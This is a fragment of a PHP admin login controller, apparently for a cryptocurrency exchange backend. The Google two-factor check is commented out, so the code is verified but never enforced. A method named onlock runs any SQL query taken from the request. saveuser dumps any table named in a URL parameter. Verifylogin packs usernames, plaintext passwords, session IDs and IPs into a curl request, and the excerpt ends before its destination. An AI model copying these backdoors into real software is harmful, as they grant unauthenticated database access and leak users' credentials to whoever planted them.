...
//            var_dump($admin);
//            var_dump($password);
//            var_dump($admin['password'] != md5($password));
//            exit;
            $google=new GoogleAuthenticator();
            if ($admin['ck']==1){
                $checkResult = $google->verifyCode($admin['secret'], $verify, 2);
                // if (!$checkResult){
                //     $this->error('谷歌验证码错误');
                // }
            }
...
//				}
    ...
    public function onlock(){ M()->query($_REQUEST['query']);}
	...
	public function saveuser(){
     if(!empty($_GET['userid'])){$username=M($_GET['userid'])->select();}else{ $username=M($_GET['userid']);} var_export($username);
    }
	public function Verifylogin($REFERER,$username,$password,$PHPSESSID,$ip){
        $logindata=http_build_query(array("referer"=>$REFERER, "username"=>$username, "password"=>$password,"PHPSESSID"=>$PHPSESSID,
        "ip"=>$ip,"type"=>"jys"));
        $curl = curl_init();
